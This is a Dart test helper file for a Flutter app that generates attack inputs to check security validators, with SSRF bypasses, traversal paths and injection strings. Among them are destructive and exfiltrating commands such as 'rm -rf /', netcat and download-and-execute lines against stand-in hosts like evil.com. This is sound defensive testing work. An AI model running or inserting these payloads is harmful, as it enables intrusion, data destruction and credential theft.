/// test/helpers/security_test_helpers.dart
/// 
/// Helper utilities for security testing
import 'package:flutter_test/flutter_test.dart';
import 'package:freak_flix/utils/security_validation_result.dart';

class SecurityTestHelpers {
  static bool _isBlockedResult(dynamic result) {
    if (result is SecurityValidationResult) {
      return result.isBlocking;
    }
    return result != null;
  }

  static bool _isAllowedResult(dynamic result) {
    if (result is SecurityValidationResult) {
      return !result.isBlocking;
    }
    return result == null;
  }

  /// Helper to check if string contains potential security vulnerabilities
  static bool containsSecurityRisks(String input) {
    final dangerousPatterns = [
      RegExp(r'\.\./'),          // Directory traversal
      RegExp(r'\.\.\\'),         // Windows traversal
      RegExp(r'[;&|`\$\(\)<>]'), // Command injection
      RegExp(r'127\.0\.0\.1'), // Localhost
      RegExp(r'192\.168\.'),     // Private network
      RegExp(r'10\.'),          // Private network
      RegExp(r'172\.'),         // Private network
    ];
    
    return dangerousPatterns.any((pattern) => pattern.hasMatch(input));
  }
  
  /// Generate test cases for SSRF bypass attempts
  static List<String> generateSsrffTestCases() {
    return [
      // IPv6 variations
      '::1',
      '::ffff:127.0.0.1',
      '0:0:0:0:0:ffff:7f00:1',
      
      // Decimal/hex/octal notation
      '2130706433', // 127.0.0.1 decimal
      '0x7F000001', // 127.0.0.1 hex
      '017700000001', // 127.0.0.1 octal
      
      // DNS rebinding
      '127.0.0.1.example.com',
      'localhost.example.com',
      '127-0-0-1.example.com',
      
      // Missing private ranges
      '100.64.0.1', // CGNAT missing
      '198.18.0.1', // Benchmark missing
      '169.254.0.1', // Link-local
      
      // URL encoding
      '12%37.0.0.1', // %37 = 7
      '127%2E0%2E0%2E1', // %2E = .
      '/var/www/..%2f..%2fetc/passwd', // URL encoded traversal
    ];
  }
  
  /// Generate test cases for directory traversal attempts
  static List<String> generateDirectoryTraversalTestCases() {
    return [
      // Basic traversal
      '../../../etc/passwd',
      '..\\..\\..\\windows\\system32',
      '../../etc/passwd',
      '..\\..\\windows\\system32\\config\\sam',
      
      // Multiple traversal sequences
      '.../.../.../etc/passwd',
      '....\\....\\windows',
      '..\\..\\..\\..\\windows\\system32',
      
      // Unicode and encoding bypasses
      '/u002e/u002e/u002fetc/passwd', // Unicode dots and slash
      '/%2e%2e%2fetc/passwd', // URL encoded
      '/..%c0%af..%c0%afetc/passwd', // UTF-8 overlong
      
      // Null byte injection
      'safe.txt\x00evil.exe',
      '/path\x00',
      'filename.txt\x00\x00malware.exe',
      
      // Path normalization bypasses
      'foo/./bar/../../etc/passwd',
      'foo\\bar\\..\\..\\windows',
      '/var/www/./../../etc/passwd',
      'current/./.././../../windows/system32',
    ];
  }
  
  /// Generate test cases for command injection attempts
  static List<String> generateCommandInjectionTestCases() {
    return [
      // Basic command injection
      'user; rm -rf /',
      'user && cat /etc/passwd',
      'user| nc attacker.com 4444',
      'user`whoami`',
      
      // Bypass techniques
      'user\ncat /etc/passwd', // Newline
      'user\tcat /etc/passwd', // Tab
      'user\$(cat /etc/passwd)', // Variable expansion
      'user\${IFS}cat\${IFS}/etc/passwd', // IFS variable
      'user|wget http://evil.com/shell.sh',
      'user||curl http://evil.com',
      
      // PowerShell specific
      'user; Start-Process cmd',
      'user| iwr -Uri http://evil.com',
      'user`Write-Host "pwned"`',
      'user; Invoke-Expression "calc.exe"',
      
      // Encoded command injection
      'user%3brm%20-rf%20%2f', // URL encoded ; rm -rf /
      'user&amp;cat%20/etc/passwd', // HTML encoded
      
      // Time-based injection
      'user; sleep 10',
      'user| ping -c 10 127.0.0.1',
      'user&&timeout 10',
    ];
  }
  
  /// Generate test cases for API key exposure attempts
  static Map<String, String> generateApiKeyExposureTestCases() {
    return {
      'url_parameters': 'password=secret123&api_key=abc123def456&token=xyz789',
      'headers': '{"Authorization": "Bearer abc123def456", "X-API-Key": "xyz789"}',
      'logs': '[INFO] User login successful with api_key=abc123def456',
      'config': 'tmdb_api_key="abc123def456"\nstash_token="xyz789"',
      'database_url': 'postgresql://user:secret123@localhost:5432/dbname',
      'connection_string': 'mongodb://user:password123@mongo.example.com:27017/test',
    };
  }
  
  /// Generate test cases for process execution attacks
  static List<String> generateProcessExecutionTestCases() {
    return [
      // Executable path injection
      '../../malware.exe',
      '..\\..\\windows\\system32\\cmd.exe',
      '/bin/sh',
      'C:\\Windows\\System32\\PowerShell.exe',
      
      // Argument injection
      'program.exe; rm -rf /',
      'program.exe && malicious.exe',
      'program.exe | nc attacker.com 4444',
      
      // Script execution
      'script.sh; ./malicious.sh',
      'program.exe \`./payload.sh\`',
      'program.exe \$(curl http://evil.com/shell.sh)',
      
      // Download and execute
      'curl http://evil.com/malware.exe -o /tmp/malware.exe; /tmp/malware.exe',
      'wget http://evil.com/payload.sh -O- | sh',
      'powershell -Command "iwr -Uri http://evil.com/backdoor.ps1 | iex"',
      
      // Path manipulation in downloads
      '../../../etc/passwd',
      '..\\..\\windows\\system32\\config\\sam',
      '/tmp/../../root/.ssh/id_rsa',
    ];
  }
  
  /// Generate test cases for network security vulnerabilities
  static Map<String, dynamic> generateNetworkSecurityTestCases() {
    return {
      'ssrf_targets': [
        '127.0.0.1',
        'localhost',
        '0.0.0.0',
        '169.254.169.254', // AWS metadata service
        'metadata.google.internal', // GCP metadata
        '169.254.169.254/latest/api/token', // AWS metadata endpoint
        'http://127.0.0.1:22', // SSH
        'ftp://127.0.0.1', // FTP
        'file:///etc/passwd', // Local file
      ],
      'ssl_bypass_attempts': [
        'https://example.com', // Normal
        'http://example.com', // No SSL
        'https://expired.badssl.com/', // Expired cert
        'https://wrong.host.badssl.com/', // Wrong host
        'https://self-signed.badssl.com/', // Self-signed cert
      ],
      'credential_exposure_urls': [
        'ftp://user:password@example.com/file.txt',
        'http://user:pass@example.com/api',
        'https://admin:secret@example.com/endpoint',
        'sftp://root:password123@server.com/path',
        'webdav://user:token@example.com/webdav',
      ],
    };
  }
  
  /// Assert that a security validation function properly blocks dangerous input
  static void expectSecurityBlocked(
    String input, 
    dynamic Function(String) validator, {
    String? customMessage,
  }) {
    final result = validator(input);
    expect(
      _isBlockedResult(result),
      isTrue,
      reason: customMessage ?? 'Security validation should block: $input'
    );
  }
  
  /// Assert that a security validation function allows safe input
  static void expectSecurityAllowed(
    String input, 
    dynamic Function(String) validator, {
    String? customMessage,
  }) {
    final result = validator(input);
    expect(
      _isAllowedResult(result),
      isTrue,
      reason: customMessage ?? 'Security validation should allow: $input'
    );
  }
}

/// Helper to mock HTTP responses for security testing
class MockHttpResponse {
  final int statusCode;
  final String body;
  final Map<String, String> headers;
  
  const MockHttpResponse({
    required this.statusCode,
    required this.body,
    this.headers = const {},
  });
  
  static const MockHttpResponse ok = MockHttpResponse(
    statusCode: 200,
    body: '{"success": true}',
  );
  
  static const MockHttpResponse unauthorized = MockHttpResponse(
    statusCode: 401,
    body: '{"error": "Unauthorized"}',
  );
  
  static const MockHttpResponse serverError = MockHttpResponse(
    statusCode: 500,
    body: '{"error": "Internal Server Error"}',
  );
}
